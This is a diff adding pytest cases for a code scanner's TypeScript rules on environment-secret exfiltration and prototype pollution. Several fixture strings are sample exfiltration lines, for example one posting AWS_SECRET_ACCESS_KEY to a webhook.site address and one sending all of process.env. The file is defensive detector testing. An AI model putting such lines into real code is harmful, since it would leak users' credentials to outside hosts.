@@ -417,6 +417,50 @@ class TestTSDangerRules:
         ids = {f["rule_id"] for f in danger}
         assert "SKY-D327" in ids
 
+    @pytest.mark.parametrize(
+        "code,expected",
+        [
+            (
+                "fetch(`https://api.github.com/users/${u}`, {\n"
+                "  headers: { Authorization: `Bearer ${process.env.GITHUB_TOKEN}` },\n"
+                "});\n",
+                False,
+            ),
+            (
+                "fetch('https://api.example.com/x', { method: 'POST',\n"
+                "  headers: { 'x-api-key': process.env.KEY }, body: JSON.stringify({ a }) });\n",
+                False,
+            ),
+            (
+                "axios.post('https://webhook.site/abc', { key: process.env.AWS_SECRET_ACCESS_KEY });\n",
+                True,
+            ),
+            (
+                "fetch(url, { method: 'POST', body: JSON.stringify({ env: process.env }) });\n",
+                True,
+            ),
+            (
+                "fetch('http://localhost:3000/log', { method: 'POST', body: JSON.stringify(process.env) });\n",
+                False,
+            ),
+        ],
+        ids=[
+            "auth_header",
+            "api_key_header_with_body",
+            "axios_payload",
+            "whole_env_body",
+            "local_destination",
+        ],
+    )
+    def test_env_exfil_needs_env_in_the_request_payload(self, tmp_path, code, expected):
+        _, _, _, danger = _scan_ts(tmp_path, code)
+        assert ("SKY-D327" in {f["rule_id"] for f in danger}) is expected
+
+    def test_proto_read_is_not_prototype_pollution(self, tmp_path):
+        code = "const same = Object.getPrototypeOf(o) === o.__proto__;\nfoo.__proto__.bar;\n"
+        _, _, _, danger = _scan_ts(tmp_path, code)
+        assert "SKY-D510" not in {f["rule_id"] for f in danger}
+
     def test_child_process_exec_safe_named_import_alias_flagged(self, tmp_path):
         code = (
             'import * as stmt from "child_process";\n'
